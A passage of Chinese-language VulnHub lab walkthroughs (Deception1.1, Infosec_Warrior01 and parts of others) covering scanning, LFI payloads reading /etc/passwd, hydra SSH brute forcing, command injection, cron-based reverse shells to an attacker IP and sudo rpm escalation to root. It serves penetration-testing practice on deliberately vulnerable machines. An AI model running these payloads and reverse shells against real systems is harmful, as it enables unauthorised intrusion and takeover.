<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip3 install stegcracker</span><br><span class="line"></span><br><span class="line">stegcracker var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">Successfully cracked file with password: iloveyoumom</span><br><span class="line">Tried 51349 passwords</span><br><span class="line">Your file has been written to: var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line"></span><br><span class="line">cat var&#x2F;ftp&#x2F;pub&#x2F;howard&#x2F;marsroversketch.jpg.out</span><br><span class="line">FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>FLAG-howard&#123;b3d1baf22e07874bf744ad7947519bf4&#125;</code></strong></p>
<ul>
<li>FLAG-leonard</li>
</ul>
<p>查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># m h dom mon dow user	command</span><br><span class="line">17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">*&#x2F;1 *	* * *	root	&#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.py</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<p>查看文件<code>/home/leonard/thermostat_set_temp.py</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;leonard</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 42 Mar 30 15:52 thermostat_set_temp.sh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>计划任务里写的是<code>.py</code>，但这里是<code>.sh</code>?</p>
</blockquote>
<p>文件可写，可以写入反弹bash命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;9990 0&gt;&amp;1&quot; &gt; &#x2F;home&#x2F;leonard&#x2F;thermostat_set_temp.sh</span><br></pre></td></tr></table></figure>
<p>本地监听9990端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9990</span><br><span class="line">Ncat: Version 7.80 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::9990</span><br><span class="line">Ncat: Listening on 0.0.0.0:9990</span><br><span class="line">Ncat: Connection from 192.168.1.105.</span><br><span class="line">Ncat: Connection from 192.168.1.105:42922.</span><br><span class="line">bash: cannot set terminal process group (2108): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">	uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<p>查看flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat FLAG-leonard.txt</span><br><span class="line">FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</span><br></pre></td></tr></table></figure>
<p><strong><code>FLAG-leonard&#123;17fc95224b65286941c54747704acd3e&#125;</code></strong></p>
<hr />
<blockquote>
<p><code>/etc/crontab</code></p>
</blockquote>
<p>由于之前一直没有接触到计划任务的提权方法，在操作过程中便没有想到这一点<br />
其原理大概与SUID差不多，低权用户以高权用户的身份执行命令</p>
<blockquote>
<p>grep高亮</p>
</blockquote>
<p>在grep节选flag时，出现了回显，便说明存在&quot;FLAG&quot;字样，但是由于字符太多、太密，难以寻找flag<br />
个人操作时直接将文本拷贝至windows的notepad++中，然后Ctrl+F查找<br />
后来想到grep可以高亮文本，加上参数<code>--color=auto</code>即可</p>
<blockquote>
<p>搜点</p>
</blockquote>
<p>或许用信息扫荡来描述这一行为更合适<br />
当时个人状态不佳，没有仔细思考就用ftp客户端连上服务器，然后用<code>get</code>命令一个一个地下载文件<br />
后来发现还是漏了一些比较重要的信息<br />
或许在动手之前需要思考下，如何获取信息是最便捷的，有哪些地方需要搜查，否则可能会因为一次搜点的小疏漏而让工作量提升一半。</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/tbbt-funwithflags-vulnhub-walkthrough/">WP</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/markLogZhu/p/11398028.html">Mysql.Backup</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hujiapeng/p/8470099.html">curl.Download</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014236541/article/details/44516465">grep.highlight</a></p>
</blockquote>
<hr />
<h1 id="deception11"><a class="markdownIt-Anchor" href="#deception11"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/haclabs-deception11,440/">Deception1.1</a></h1>
<p><code>2020/04/04 23:31:03</code></p>
<h2 id="端口扫描-15"><a class="markdownIt-Anchor" href="#端口扫描-15"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.110</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.110</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)</span><br><span class="line">|   256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)</span><br><span class="line">|_  256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS HEAD GET</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:4B:4E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 22.680 days (since Thu Mar 12 19:47:39 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-15"><a class="markdownIt-Anchor" href="#web路径枚举-15"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径</p>
<p><code>dirb http://192.168.31.110/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.110&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;index.html (CODE:200|SIZE:1315)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.110&#x2F;manual&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.110&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-15"><a class="markdownIt-Anchor" href="#漏洞利用-15"></a> 漏洞利用</h2>
<ul>
<li>访问<code>/</code></li>
</ul>
<p>该页面提供一个密码强度检测的功能<br />
若密码中含有大写字母、小写字母、数字、特殊符号，且长度为8位及上，则会用alert弹出信息<br />
<code>0000flagflagflagflag.php</code><br />
而且页面内的内容为<br />
<code>Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1</code><br />
这里的<code>with flag=1</code>就是个提示</p>
<p>尝试后发现存在php文件<code>/00001111.php</code><br />
alter弹出信息为<code>find password.txt</code><br />
页面内容为空白<br />
源代码中存在注释信息<code>use ?page=</code><br />
即可以使用get参数page</p>
<p>访问<code>/00001111.php?page=index.html</code><br />
此时以页面为主页，则可判断page参数存在包含功能<br />
有两种利用方式</p>
<ul>
<li>php伪协议进行LFI</li>
<li>file伪协议直接读取文件</li>
</ul>
<p>测试过程中两种方法均可使用，POC如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>尝试寻找password.txt<br />
最后在找到路径为<code>/var/password.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;password.txt</span><br><span class="line"></span><br><span class="line">I know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH </span><br></pre></td></tr></table></figure>
<p>构造字典如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat dic.py</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;python2</span><br><span class="line"></span><br><span class="line">raw &#x3D; &#39;ya5h&#39;</span><br><span class="line">charset &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#96;~!@#$%^&amp;*()_+-&#x3D;[]&#123;&#125;\|;:\&#39;&quot;,.&lt;&gt;&#x2F;?&#39;</span><br><span class="line"></span><br><span class="line">for i in charset:</span><br><span class="line">    for j in charset:</span><br><span class="line">        print raw + i + j</span><br></pre></td></tr></table></figure>
<p>使用hydra对于SSH服务进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python dic.py &gt; pass</span><br><span class="line">hydra -I -l yash -P pass -V ssh:&#x2F;&#x2F;192.168.31.110</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.110   login: yash   password: ya5hay</span><br></pre></td></tr></table></figure>
<p>得到账户yash</p>
<h2 id="权限提升-15"><a class="markdownIt-Anchor" href="#权限提升-15"></a> 权限提升</h2>
<p>登入服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.110</span><br><span class="line">ya5hay</span><br></pre></td></tr></table></figure>
<p>查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line">17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly</span><br><span class="line">25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )</span><br><span class="line">47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )</span><br><span class="line">52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )</span><br><span class="line">#</span><br><span class="line">*&#x2F;1 * * * * &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure>
<p>查看文件<code>/home/yash/perm.sh</code>的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;yash&#x2F;perm.sh </span><br><span class="line"></span><br><span class="line">-rwxrw-rw- 1 root root 29 Apr  5  2020 &#x2F;home&#x2F;yash&#x2F;perm.sh</span><br></pre></td></tr></table></figure>
<p>该文件可写，可以利用改文件进行计划任务提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;nc -e &#x2F;bin&#x2F;sh 192.168.31.10 9890&#39; &gt; perm.sh</span><br></pre></td></tr></table></figure>
<p>Kali上监听端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9890</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/6542398.html">LFI</a></p>
</blockquote>
<hr />
<h1 id="infosec_warrior01"><a class="markdownIt-Anchor" href="#infosec_warrior01"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-01,446/">Infosec_Warrior01</a></h1>
<p><code>2020/04/12 11:41:51</code></p>
<h2 id="端口扫描-16"><a class="markdownIt-Anchor" href="#端口扫描-16"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.172</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.172</span><br><span class="line">Host is up (0.00054s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2f:b3:a5:cd:e5:14:33:a1:82:3b:dd:5a:5e:d7:59:36 (DSA)</span><br><span class="line">|_  2048 2d:b4:15:28:36:d8:b5:4e:18:81:8e:af:3e:e4:de:c1 (RSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.15 (CentOS)</span><br><span class="line">|_http-title: Apache HTTP Server Test Page powered by CentOS</span><br><span class="line">MAC Address: 08:00:27:EC:26:4D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Uptime guess: 0.001 days (since Sat Apr 11 23:43:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-16"><a class="markdownIt-Anchor" href="#web路径枚举-16"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.31.172/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.172&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;cgi-bin&#x2F; (CODE:403|SIZE:290)                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.172&#x2F;sitemap.xml (CODE:200|SIZE:292)                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.172&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>访问<code>http://192.168.31.172/wordpress/</code></li>
</ul>
<p>响应状态码为500，显示<code>Error establishing a database connection</code><br />
Wordpress框架不可用</p>
<ul>
<li>访问<code>http://192.168.31.172/sitemap.xml</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlset&gt;</span><br><span class="line">	&lt;url&gt;</span><br><span class="line">		&lt;loc&gt;http:&#x2F;&#x2F;infosecwarrior.com&#x2F;index.htnl&lt;&#x2F;loc&gt;</span><br><span class="line">		&lt;lastmod&gt;2020-02-13&lt;&#x2F;lastmod&gt;</span><br><span class="line">		&lt;changefreq&gt;monthly&lt;&#x2F;changefreq&gt;</span><br><span class="line">		&lt;priority&gt;0.8&lt;&#x2F;priority&gt;</span><br><span class="line">	&lt;&#x2F;url&gt;</span><br><span class="line">&lt;&#x2F;urlset&gt;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-16"><a class="markdownIt-Anchor" href="#漏洞利用-16"></a> 漏洞利用</h2>
<p>访问<code>http://192.168.31.172/sitemap.xml</code>有一行内容<br />
<code>&lt;loc&gt;http://infosecwarrior.com/index.htnl&lt;/loc&gt;</code></p>
<p>访问<code>http://192.168.31.172/index.htnl</code>成功</p>
<p>审计html代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;cmd.php&quot; method&#x3D;&quot;GET&quot; hidden&#x3D;&quot;True&quot;&gt;</span><br><span class="line"> command</span><br><span class="line">     &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;AI&quot; value&#x3D;&quot;&quot; maxlength&#x3D;&quot;100&quot;&gt;</span><br><span class="line"> &lt;br&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<p>删去<code>hidden=&quot;True&quot;</code><br />
尝试进行命令执行，在表单中输入<code>ls</code><br />
回显为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Now the main part what it is loooooool</span><br><span class="line">Try other method</span><br></pre></td></tr></table></figure>
<p>而且URL为<code>http://192.168.31.172/cmd.php?AI=ls</code></p>
<p>改为POST请求<br />
执行成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;ls&quot;</span><br><span class="line"></span><br><span class="line">You Found ME : - (</span><br><span class="line"></span><br><span class="line">cmd.php</span><br><span class="line">hacker.gif</span><br><span class="line">index.htnl</span><br><span class="line">minnions.gif</span><br><span class="line">note.txt</span><br><span class="line">sitemap.xml</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure>
<p>即存在命令执行漏洞</p>
<p>查看cmd.php的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;cat cmd.php&quot;</span><br><span class="line"></span><br><span class="line">$user&#x3D;&quot;isw0&quot;;</span><br><span class="line">$pass&#x3D;&quot;123456789blabla&quot;;</span><br></pre></td></tr></table></figure>
<p>获取到账户</p>
<h2 id="权限提升-16"><a class="markdownIt-Anchor" href="#权限提升-16"></a> 权限提升</h2>
<p>登入服务器的SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh isw0@192.168.31.172</span><br><span class="line">123456789blabla</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User isw0 may run the following commands on this host:</span><br><span class="line">    (!root) NOPASSWD: &#x2F;bin&#x2F;bash</span><br><span class="line">    (root) &#x2F;bin&#x2F;ping, (root) &#x2F;bin&#x2F;ping6, (root) &#x2F;bin&#x2F;rpm, (root) &#x2F;bin&#x2F;ls, (root) &#x2F;bin&#x2F;mktemp</span><br></pre></td></tr></table></figure>
<p>使用root账户的rpm命令进行权限提升</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root rpm --eval &#39;%&#123;lua:posix.exec(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>Wordpress服务500</p>
</blockquote>
<p>在之前的靶机中从来没有遇到这个情况，便主观地猜测靶机配置是否有误，最后看WP的思路才让我顿悟。有几分脑洞，但是sitemap.xml也确实被dirb扫描出来了，里面的<code>index.htnl</code>也是在提示玩家，只能说收集信息的时候还是要仔细看看，毕竟<code>index.html</code>和<code>index.htnl</code>乍一看太难以区分</p>
<blockquote>
<p>rpm执行命令</p>
</blockquote>
<p>乍一看rpm有sudo，以为要构造恶意安装包来获取提权，没想到rpm可以直接执行命令</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.armourinfosec.com/infosecwarrior-ctf-2020-01-walkthrough/">WP</a><br />
<a target="_blank" rel="noopener" href="https://cooolis.payloads.online/lolbas/Linux/rpm/">rpm.payload</a></p>
</blockquote>
<hr />
<h1 id="my-tomcat-host-1"><a class="markdownIt-Anchor" href="#my-tomcat-host-1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/my-tomcat-host-1,457/">My Tomcat Host: 1</a></h1>
<p><code>2020/04/25 00:43:06</code></p>
<h2 id="寻找靶机ip"><a class="markdownIt-Anchor" href="#寻找靶机ip"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/00.png" alt="" /></p>
<h2 id="端口扫描-17"><a class="markdownIt-Anchor" href="#端口扫描-17"></a> 端口扫描</h2>
